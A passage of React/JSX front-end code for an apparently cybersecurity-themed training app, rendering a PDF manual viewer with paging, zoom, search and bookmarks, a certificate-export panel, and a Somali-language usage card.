                      <ChevronLeft size={14} />
                    </button>
                    <span className="font-mono text-xs text-cyber-text px-2.5 select-none">
                      PAGE <span className="text-cyber-green font-bold">{currentPage}</span> / {selectedManual.totalPages}
                    </span>
                    <button
                      onClick={() => setCurrentPage(prev => Math.min(selectedManual.totalPages, prev + 1))}
                      disabled={currentPage === selectedManual.totalPages}
                      className="p-1.5 rounded hover:bg-cyber-border text-cyber-text disabled:opacity-30 disabled:hover:bg-transparent cursor-pointer"
                      title="Next Page"
                    >
                      <ChevronRight size={14} />
                    </button>
                  </div>

                  {/* Page slider */}
                  <input 
                    type="range"
                    min={1}
                    max={selectedManual.totalPages}
                    value={currentPage}
                    onChange={(e) => setCurrentPage(parseInt(e.target.value))}
                    className="w-20 md:w-28 accent-cyber-green cursor-pointer hidden sm:block"
                  />
                </div>

                {/* Zoom & Bookmarks & Themes */}
                <div className="flex items-center justify-between md:justify-end gap-3">
                  
                  {/* Search inside PDF input */}
                  <form onSubmit={handleSearch} className="relative max-w-[140px] md:max-w-[180px]">
                    <input
                      type="text"
                      placeholder="Search text..."
                      value={searchTerm}
                      onChange={(e) => setSearchTerm(e.target.value)}
                      className="w-full bg-cyber-card border border-cyber-border focus:border-cyber-green/40 rounded-lg pl-8 pr-3 py-1.5 text-xs font-mono text-cyber-text outline-none transition-colors"
                    />
                    <Search size={12} className="absolute left-2.5 top-2.5 text-cyber-text-muted" />
                  </form>

                  <div className="flex items-center bg-cyber-card border border-cyber-border rounded-lg p-1">
                    <button
                      onClick={() => setZoomLevel(prev => Math.max(75, prev - 25))}
                      className="p-1 rounded hover:bg-cyber-border text-cyber-text-muted hover:text-cyber-text cursor-pointer"
                      title="Zoom Out"
                    >
                      <ZoomOut size={13} />
                    </button>
                    <span className="font-mono text-[10px] text-cyber-text-muted px-1.5 select-none w-10 text-center">
                      {zoomLevel}%
                    </span>
                    <button
                      onClick={() => setZoomLevel(prev => Math.min(150, prev + 25))}
                      className="p-1 rounded hover:bg-cyber-border text-cyber-text-muted hover:text-cyber-text cursor-pointer"
                      title="Zoom In"
                    >
                      <ZoomIn size={13} />
                    </button>
                  </div>

                  {/* Bookmark button */}
                  <button
                    onClick={toggleBookmark}
                    className={`p-2 rounded-lg border transition-all cursor-pointer ${
                      bookmarks.includes(`${selectedManual.id}-p${currentPage}`)
                        ? "bg-cyber-orange/10 border-cyber-orange text-cyber-orange"
                        : "bg-cyber-card border-cyber-border hover:bg-cyber-border text-cyber-text-muted hover:text-cyber-text"
                    }`}
                    title="Bookmark Page"
                  >
                    <Bookmark size={13} />
                  </button>

                  {/* Reader Theme selection */}
                  <div className="flex items-center bg-cyber-card border border-cyber-border rounded-lg p-1 text-[10px] font-mono select-none">
                    <button
                      onClick={() => setReaderTheme("cyber")}
                      className={`px-1.5 py-0.5 rounded ${readerTheme === "cyber" ? "bg-cyber-green/10 text-cyber-green font-bold" : "text-cyber-text-muted"}`}
                    >
                      CYBER
                    </button>
                    <button
                      onClick={() => setReaderTheme("clean")}
                      className={`px-1.5 py-0.5 rounded ${readerTheme === "clean" ? "bg-cyber-blue/10 text-cyber-blue font-bold" : "text-cyber-text-muted"}`}
                    >
                      CLEAN
                    </button>
                  </div>
                </div>
              </div>

              {/* PDF Document Viewer Container (Scrollable canvas viewport) */}
              <div className="p-6 md:p-8 flex-1 overflow-y-auto max-h-[500px] min-h-[350px] relative transition-colors duration-200 bg-cyber-card-bg">
                
                {/* Search Matches status badge */}
                {searchTerm.trim() && (
                  <div className="absolute top-4 right-4 bg-cyber-card/90 border border-cyber-border px-3 py-1.5 rounded-lg text-[10px] font-mono z-10">
                    MATCHES: <span className="text-cyber-orange font-bold">{searchMatches.length}</span> PAGES
                  </div>
                )}

                {/* PDF Page Sheet */}
                <motion.div
                  key={`${selectedManual.id}-p${currentPage}`}
                  initial={{ opacity: 0, scale: 0.98 }}
                  animate={{ opacity: 1, scale: 1 }}
                  transition={{ duration: 0.15 }}
                  style={{ transform: `scale(${zoomLevel / 100})`, transformOrigin: "top center" }}
                  className={`w-full max-w-2xl mx-auto rounded-xl border p-6 md:p-8 space-y-4 shadow-xl select-text transition-colors duration-200 ${
                    readerTheme === "cyber"
                      ? "bg-[#0b0c0d] border-cyber-green/20 text-[#abb2bf] shadow-[0_0_20px_rgba(0,255,102,0.02)]"
                      : "bg-[#fdfdfd] border-[#e2e8f0] text-[#1e293b] shadow-[0_4px_12px_rgba(15,23,42,0.04)]"
                  }`}
                >
                  {/* Document Page Header metadata */}
                  <div className="flex justify-between items-center border-b pb-3 font-mono text-[9px] tracking-wider uppercase border-cyber-border select-none">
                    <div className="flex items-center gap-1.5">
                      <ShieldCheck size={11} className="text-cyber-green" />
                      <span className={readerTheme === "cyber" ? "text-cyber-green" : "text-emerald-600 font-bold"}>
                        {selectedManual.classification}
                      </span>
                    </div>
                    <span>{selectedManual.author}</span>
                  </div>

                  {/* Page Title */}
                  <div className="space-y-1">
                    <h2 className={`font-display text-base md:text-lg font-black tracking-tight ${
                      readerTheme === "cyber" ? "text-cyber-text" : "text-slate-900"
                    }`}>
                      {activePageContent?.title}
                    </h2>
                    <div className="h-[2px] w-12 bg-cyber-green" />
                  </div>

                  {/* Main Page Content Body with Highlighter search support */}
                  <div className={`text-xs md:text-sm leading-relaxed whitespace-pre-wrap font-sans font-medium select-text tracking-wide ${
                    readerTheme === "cyber" ? "text-cyber-text" : "text-slate-700"
                  }`}>
                    {activePageContent ? highlightContent(activePageContent.content, searchTerm) : "Error loading page content."}
                  </div>

                  {/* Footer of current page */}
                  <div className="pt-5 border-t border-cyber-border flex justify-between items-center font-mono text-[8px] text-cyber-text-muted select-none uppercase">
                    <span>SECURITY DOCUMENT INTEGRITY PASSED</span>
                    <span>PAGE {currentPage} OF {selectedManual.totalPages}</span>
                  </div>
                </motion.div>
              </div>

              {/* PDF Viewer Footer bar information summary */}
              <div className="bg-cyber-input-bg border-t border-cyber-border px-4 py-3 font-mono text-[10px] text-cyber-text-muted flex flex-col sm:flex-row justify-between gap-2">
                <div className="flex items-center gap-1.5">
                  <Terminal size={12} className="text-cyber-green" />
                  <span>ACTIVE READER REFERENCE: <span className="text-cyber-green font-bold uppercase">{selectedManual.title.slice(0, 30)}...</span></span>
                </div>
                <span>CYBER ARCHIVE HANDSHAKE VALIDATED</span>
              </div>
            </div>
          </motion.div>
        ) : (
          <motion.div 
            key="export-tab"
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            className="bg-cyber-card border border-cyber-border rounded-2xl p-6 md:p-8 space-y-6 relative overflow-hidden shadow-2xl"
          >
            {/* Ambient visual badge background */}
            <div className="absolute -bottom-20 -right-20 w-80 h-80 bg-cyber-green/5 blur-3xl rounded-full" />
            
            {/* Visual description panel */}
            <div className="grid grid-cols-1 md:grid-cols-12 gap-6 items-center">
              
              <div className="md:col-span-8 space-y-4">
                <div className="inline-flex items-center gap-1.5 bg-cyber-green/10 border border-cyber-green/30 px-3 py-1 rounded-full">
                  <Award size={14} className="text-cyber-green" />
                  <span className="font-mono text-[9px] text-cyber-green font-bold tracking-widest uppercase">
                    CYBER CLEARANCE CERTIFICATION ENGINE
                  </span>
                </div>
                
                <h3 className="font-display text-2xl font-black text-cyber-text uppercase tracking-tight">
                  Download Operator Clearance Certificate & Lesson Logs
                </h3>
                
                <p className="text-xs text-cyber-text-muted font-sans leading-relaxed">
                  Export your compiled hacking portfolio, finished practice labs, terminal commands history, and current security status into a beautifully styled PDF document. This document acts as an official certificate of defensive training under the <strong>armaani</strong> operator name.
                </p>

                <div className="grid grid-cols-2 gap-4 pt-2">
                  <div className="p-3 bg-cyber-input-bg/50 border border-cyber-border rounded-xl">
                    <span className="font-mono text-[10px] text-cyber-text-muted uppercase block">PDF TEMPLATE</span>
                    <span className="text-xs text-cyber-text font-bold">Futuristic Security Shield Layout</span>
                  </div>
                  <div className="p-3 bg-cyber-input-bg/50 border border-cyber-border rounded-xl">
                    <span className="font-mono text-[10px] text-cyber-text-muted uppercase block">VERIFICATION STATE</span>
                    <span className="text-xs text-cyber-green font-bold flex items-center gap-1">
                      <CheckCircle size={12} /> SECURE CRYPTO BADGE
                    </span>
                  </div>
                </div>

                <div className="pt-4 flex flex-wrap gap-3">
                  <button
                    onClick={generateProgressPDF}
                    className="px-6 py-3.5 bg-cyber-green hover:bg-[#00e15c] text-black font-display font-black text-xs rounded-xl tracking-wider uppercase transition-all flex items-center justify-center gap-2 shadow-lg shadow-cyber-green/10 cursor-pointer active:scale-95"
                  >
                    <Download size={14} />
                    Download Clearance PDF Report
                  </button>
                  <button
                    onClick={generateProgressPDF}
                    className="px-5 py-3.5 bg-cyber-input-bg hover:bg-cyber-border border border-cyber-border text-cyber-text font-display font-black text-xs rounded-xl tracking-wider uppercase transition-all flex items-center justify-center gap-2 cursor-pointer"
                  >
                    <Printer size={14} />
                    Print PDF Sheet
                  </button>
                </div>
              </div>

              {/* Futuristic Interactive Preview card */}
              <div className="md:col-span-4 bg-cyber-input-bg border border-cyber-border p-5 rounded-2xl space-y-4 shadow-xl relative overflow-hidden">
                <div className="absolute top-0 left-0 right-0 h-1 bg-cyber-green animate-pulse" />
                
                <div className="flex justify-between items-start">
                  <ShieldCheck size={28} className="text-cyber-green animate-pulse" />
                  <span className="font-mono text-[9px] text-cyber-text-muted border border-cyber-border px-1.5 py-0.5 rounded">
                    PREVIEW
                  </span>
                </div>

                <div className="space-y-3">
                  <div className="space-y-1">
                    <span className="font-mono text-[8px] text-cyber-green block uppercase tracking-widest">OFFICIAL SECURITY CERTIFICATE</span>
                    <h4 className="font-display text-base font-black text-cyber-text uppercase">armaani</h4>
                  </div>
                  
                  <div className="border-t border-dashed border-cyber-border pt-2.5 space-y-2 font-mono text-[9.5px] text-cyber-text-muted">
                    <div className="flex justify-between">
                      <span>CLEARANCE LEVEL:</span>
                      <span className="text-cyber-text font-bold">LVL {state.level}</span>
                    </div>
                    <div className="flex justify-between">
                      <span>STATUS LEVEL:</span>
                      <span className="text-cyber-blue font-bold">{state.rank}</span>
                    </div>
                    <div className="flex justify-between">
                      <span>COMPLETED LABS:</span>
                      <span className="text-cyber-green font-bold">{state.completedLabs.length} DEFEATED</span>
                    </div>
                  </div>
                </div>

                <div className="pt-2 border-t border-cyber-border flex items-center gap-2">
                  <div className="h-6 w-6 rounded bg-cyber-green/10 border border-cyber-green/20 flex items-center justify-center">
                    <Award size={12} className="text-cyber-green" />
                  </div>
                  <span className="font-mono text-[8.5px] text-cyber-text-muted uppercase">SHA256 DIGITAL AUTH PASS</span>
                </div>
              </div>

            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Somali Instructions Card & User Experience */}
      <div className="bg-cyber-card border border-cyber-border p-5 rounded-2xl space-y-3">
        <h3 className="font-display text-xs font-black text-cyber-text uppercase tracking-widest flex items-center gap-1.5">
          <HelpCircle size={14} className="text-cyber-green" />
          Somali User Manual (Sida loo isticmaalo PDF-yada iyo Live Sockets)
        </h3>
        <p className="text-xs text-cyber-text-muted font-sans leading-relaxed">
          Ku soo dhawaaw Operator <strong>armaani</strong>. Halkan waxaad ku akhrisan kartaa buugaagta cybersecurity-ga si real-time ah, waxaad soo shubi kartaa PDF-yo adiga kuu gaar ah adoo isticmaalaya tab-ka kor ku qoran, sidoo kale waxaad ku shubataa <strong>Download Clearance PDF Report</strong> kaasoo soo saaraya warbixin dhameystiran iyo shahaado rasmi ah oo magacaaga ku qoranyahay oo aad kombiyutarkaaga ku keydsan karto! badhanka <strong>REAL-TIME SYNC</strong> wuxuu soo sasayaa log-yada iyo socket-yada hadda si toos ah.
        </p>
      </div>

    </div>
  );
};
